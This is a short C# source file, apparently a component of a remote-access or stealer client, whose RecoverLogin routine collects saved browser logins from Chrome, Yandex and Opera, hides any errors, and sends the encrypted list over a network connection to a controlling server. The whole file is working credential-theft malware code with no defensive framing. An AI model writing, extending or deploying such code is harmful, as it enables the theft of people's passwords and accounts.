using BrowserTools;
using Client.Core.Networking;
using Client.Core.Security;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Client.Core.Events
{
    class RecoverLogin
    {
        public static void Execute(string data)
        {
            List<LoginData> logins = new List<LoginData>();
            try
            {
                logins.AddRange(Chrome.GetLoginData());
            }
            catch
            {

            }
            try
            {
                logins.AddRange(Yandex.GetLoginData());
            }
            catch
            {

            }
            try
            {
                logins.AddRange(Opera.GetLoginData());
            }
            catch
            {

            }

            if(NetworkManager.IsConnected)
            {
                NetworkManager.Connection.SendObject("1x23", Cryptography.Encrypt(JsonConvert.SerializeObject(logins.ToArray())));
            }
        }
    }
}
